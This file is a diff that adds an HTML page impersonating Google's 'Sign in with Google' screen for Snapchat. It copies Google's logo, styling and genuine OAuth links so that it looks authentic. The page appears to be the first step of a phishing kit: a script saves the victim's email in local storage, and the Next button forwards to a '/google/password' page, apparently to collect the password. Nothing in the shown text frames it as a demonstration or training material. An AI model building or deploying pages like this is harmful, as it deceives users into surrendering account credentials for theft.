@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <!--  <link rel="stylesheet" href="styles/style.css"> -->
+    <style>
+    * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+}
+
+body {
+    background-color: #0b0b0b;
+    color: #e3e3e3;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    padding: 20px;
+}
+
+.signin-container {
+    width: 100%;
+    max-width: 440px;
+    padding: 24px;
+    background-color: #0b0b0b;
+}
+
+/* Header standard */
+.google-header {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    font-size: 14px;
+    color: #e3e3e3;
+    margin-bottom: 40px;
+}
+
+/* App Branding */
+.app-icon-container {
+    margin-bottom: 24px;
+}
+
+.snapchat-icon {
+    width: 48px;
+    height: 48px;
+    background-color: #FFFC00; /* Snapchat Yellow */
+    border-radius: 4px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+h1 {
+    font-size: 36px;
+    font-weight: 400;
+    color: #e3e3e3;
+    margin-bottom: 12px;
+}
+
+.subtitle {
+    font-size: 16px;
+    color: #e3e3e3;
+    margin-bottom: 40px;
+}
+
+.app-name {
+    color: #a8c7fa;
+}
+
+/* Material Design Floating Label Outline Input */
+.input-group {
+    position: relative;
+    margin-bottom: 12px;
+}
+
+.input-group input {
+    width: 100%;
+    padding: 20px 16px;
+    background: transparent;
+    border: 1px solid #8e918f;
+    border-radius: 4px;
+    color: #e3e3e3;
+    font-size: 16px;
+    outline: none;
+    transition: border-color 0.2s;
+}
+
+/* Input focus state */
+.input-group input:focus {
+    border: 2px solid #a8c7fa;
+    padding: 19px 15px; /* Adjusting padding to keep layout stable with 2px border */
+}
+
+/* Floating Label Logic */
+.input-group label {
+    position: absolute;
+    left: 16px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: #c4c7c5;
+    font-size: 16px;
+    pointer-events: none;
+    transition: 0.2s ease all;
+    background-color: #0b0b0b;
+    padding: 0 4px;
+}
+
+/* Move label up on focus or when input is not empty */
+.input-group input:focus ~ label,
+.input-group input:not(:placeholder-shown) ~ label {
+    top: 0;
+    font-size: 12px;
+    color: #a8c7fa;
+}
+
+.input-group input:not(:focus):not(:placeholder-shown) ~ label {
+    color: #c4c7c5;
+}
+
+/* Links */
+.forgot-link-container {
+    text-align: left;
+    margin-bottom: 40px;
+}
+
+.blue-link {
+    color: #a8c7fa;
+    text-decoration: none;
+    font-size: 14px;
+    font-weight: 500;
+}
+
+.blue-link:hover {
+    text-decoration: underline;
+}
+
+/* Disclaimer text style */
+.disclaimer {
+    font-size: 13px;
+    color: #8e918f;
+    line-height: 1.5;
+    text-align: left;
+    margin-bottom: 45px;
+}
+
+.disclaimer a {
+    color: #a8c7fa;
+    text-decoration: none;
+}
+
+/* Action row styling */
+.footer-actions {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+.create-account {
+    font-size: 14px;
+}
+
+/* Pill shaped button matching the image */
+.next-btn {
+    background-color: #a8c7fa;
+    color: #003063;
+    border: none;
+    padding: 12px 24px;
+    border-radius: 100px;
+    font-size: 14px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: background-color 0.2s;
+}
+
+.next-btn:hover {
+    background-color: #c2e7ff;
+}
+
+    </style>
+</head>
+<body>
+
+    <div class="signin-container">
+        <div class="google-header">
+            <svg viewBox="0 0 24 24" width="24" height="24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+                <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+                <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l3.66-2.85z" fill="#FBBC05"/>
+                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z" fill="#EA4335"/>
+            </svg>
+            <span>Sign in with Google</span>
+        </div>
+
+        <div class="app-icon-container">
+            <div class="snapchat-icon">
+                <svg viewBox="0 0 24 24" width="40" height="40" fill="#000000">
+                    <path d="M12 2c-3.5 0-5 2.5-5 5.5 0 1.5.5 2.5 1 3.5-.5.5-1.5 1-2.5 1-.5 0-1-.2-1-.5 0-1-1.5-1.5-2-1.5-.3 0-.5.2-.5.5 0 1.5 1.5 2.5 3 2.5.5 0 1-.2 1.5-.5.5 1 1.5 2 3.5 2.5-.5.5-1 1-1 2 0 .5.2.5.5.5h9c.3 0 .5 0 .5-.5 0-1-.5-1.5-1-2 2-.5 3-1.5 3.5-2.5.5.3 1 .5 1.5.5 1.5 0 3-1 3-2.5 0-.3-.2-.5-.5-.5-.5 0-2 .5-2 1.5 0 .3-.5.5-1 .5-1 0-2-.5-2.5-1 .5-1 1-2 1-3.5C17 4.5 15.5 2 12 2z"/>
+                </svg>
+            </div>
+        </div>
+
+        <h1>Sign in</h1>
+        <p class="subtitle">to continue to <span class="app-name">Snapchat</span></p>
+
+        <form id="loginForm" onsubmit="handleNext(event)">
+            <div class="input-group">
+                <input type="text" id="identifier" required placeholder=" ">
+                <label for="identifier">Email or phone</label>
+            </div>
+
+            <div class="forgot-link-container">
+                <a href="https://accounts.google.com/signin/v2/usernamerecovery?app_domain=https%3A%2F%2Faccounts.snapchat.com&as=2EUNomSingIFlANWtOcbWhjkvHFbga426Z%2BXwaR0vWo&client_id=126465353735-9c1kjml3cqp6ec1mfu3ts9u478np4svg.apps.googleusercontent.com&continue=https%3A%2F%2Faccounts.google.com%2Fsignin%2Foauth%2Fconsent%3Fauthuser%3Dunknown%26part%3DAJi8hAOTrtQUBvrbq8rUx8DV1A6DKi-w9n_Sf0u3_yWXpeHugp9qRtZZaf9NFQbejThp9rHhdZ1_7uwyZzAFVACtEhTmQB8C3hqWCNJZ4UC84SqNJ1VqRyxDlMyXY4EH8Td1gXSu-1NZgD0RW4rAbcEoTV42Q6TOvXumuf0iuX-vvtTlBTqgJZbi1AOfW2sSEE9uTCI7czCHjhn-cM6ziIoOVgDM1WGOv1DBJFlp5kgEam3ZOM3ki-OgPCyE6MS9KbzFHmR3slW23y8sb6reCK7092EyR9LRl_XNkm60Cfxx4ydeMU9g0nq6Ewj3qDEtDSr8RAmG823udqHVkNteB_bySQ-T4OX1tI_t7uoeL7P_EsYTdVZmxP8Xo84Nh9Ez3Vxsb_IJUKwqm6twLPhIMNyZdZl-zbTVj6cw9Gj_ZxMLkMVIqa28apdEKE-Sd_2g5-9JWClMnAxuPHO6v3-9TwT58ScVvrwrU4_wE0w_uTtBrC0FVwc-CHpi-k0PVdYy1X4AN8q7rx5h%26flowName%3DGeneralOAuthFlow%26as%3D2EUNomSingIFlANWtOcbWhjkvHFbga426Z%252BXwaR0vWo%26client_id%3D126465353735-9c1kjml3cqp6ec1mfu3ts9u478np4svg.apps.googleusercontent.com%26requestPath%3D%252Fsignin%252Foauth%252Fconsent%23&display=popup&dsh=2EUNomSingIFlANWtOcbWhjkvHFbga426Z%2BXwaR0vWo&flowName=GeneralOAuthFlow&gsiwebsdk=gis_attributes&nonce=4f63236e-cd07-4d0c-861e-c0b82ddb40b8&o2v=1&opparams=%253Fgis_params%253DGAcqKzJFVU5vbVNpbmdJRmxBTld0T2NiV2hqa3ZIRmJnYTQyNlorWHdhUjB2V284AUJAM2NlYTJmNzhhYjQ2ODRhMTU5Y2ZmMzZmOTJiZGEyYTAxYzhjMjM0NjA5NzQ0OTczZGRmNTQ0OTE0ODYzY2Q3Yw%2526response_mode%253Dform_post&origin=https%3A%2F%2Faccounts.snapchat.com&prompt=select_account&rart=ANgoxcdElEh1hzW2s8Dh8uV9ikKrMuOEUdRYjaB5PTBBalZdqIY87Ptq5oDy46uAlrrZ9ZqDyshAqLLhnoXTk47WJzNhzDcZKWLv_nUYFqRzsthfz3Obcxo&redirect_uri=gis_transform&response_type=id_token&scope=openid%20email%20profile&service=lso" class="blue-link">Forgot email?</a>
+            </div>
+
+            <p class="disclaimer">
+                Before using this app, you can review Snapchat’s 
+                <a href="https://values.snap.com/privacy/privacy-policy">Privacy Policy</a> and <a href="https://www.snap.com/terms">Terms of Service</a>.
+            </p>
+
+            <div class="footer-actions">
+                <a href="https://accounts.google.com/lifecycle/steps/signup/name?client_id=126465353735-9c1kjml3cqp6ec1mfu3ts9u478np4svg.apps.googleusercontent.com&continue=https://accounts.google.com/signin/oauth/consent?authuser%3Dunknown%26part%3DAJi8hAOTrtQUBvrbq8rUx8DV1A6DKi-w9n_Sf0u3_yWXpeHugp9qRtZZaf9NFQbejThp9rHhdZ1_7uwyZzAFVACtEhTmQB8C3hqWCNJZ4UC84SqNJ1VqRyxDlMyXY4EH8Td1gXSu-1NZgD0RW4rAbcEoTV42Q6TOvXumuf0iuX-vvtTlBTqgJZbi1AOfW2sSEE9uTCI7czCHjhn-cM6ziIoOVgDM1WGOv1DBJFlp5kgEam3ZOM3ki-OgPCyE6MS9KbzFHmR3slW23y8sb6reCK7092EyR9LRl_XNkm60Cfxx4ydeMU9g0nq6Ewj3qDEtDSr8RAmG823udqHVkNteB_bySQ-T4OX1tI_t7uoeL7P_EsYTdVZmxP8Xo84Nh9Ez3Vxsb_IJUKwqm6twLPhIMNyZdZl-zbTVj6cw9Gj_ZxMLkMVIqa28apdEKE-Sd_2g5-9JWClMnAxuPHO6v3-9TwT58ScVvrwrU4_wE0w_uTtBrC0FVwc-CHpi-k0PVdYy1X4AN8q7rx5h%26flowName%3DGeneralOAuthFlow%26as%3D2EUNomSingIFlANWtOcbWhjkvHFbga426Z%252BXwaR0vWo%26client_id%3D126465353735-9c1kjml3cqp6ec1mfu3ts9u478np4svg.apps.googleusercontent.com%26requestPath%3D%252Fsignin%252Foauth%252Fconsent%23&dsh=2EUNomSingIFlANWtOcbWhjkvHFbga426Z%2BXwaR0vWo&flowEntry=SignUp&flowName=GlifWebSignIn&rart=ANgoxcdElEh1hzW2s8Dh8uV9ikKrMuOEUdRYjaB5PTBBalZdqIY87Ptq5oDy46uAlrrZ9ZqDyshAqLLhnoXTk47WJzNhzDcZKWLv_nUYFqRzsthfz3Obcxo&scope=openid+email+profile&service=lso&TL=ADCchmacQ5V3qXNiDF2CvE-_PtZ8_JuadrnwDsXV1fJt_h_tkPF4qwFol-FS8Li2" class="blue-link create-account">Create account</a>
+                <button onclick="location='/google/password'" class="next-btn">Next</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+    function handleNext(event) {
+    event.preventDefault();
+    
+    const identifierInput = document.getElementById('identifier').value;
+    
+    if(identifierInput.trim() !== "") {
+        localStorage.removeItem("email");
+        localStorage.clear();
+        localStorage.setItem("email", `${identifierInput}`);
+    }
+}
+    </script>
+</body>
+</html>
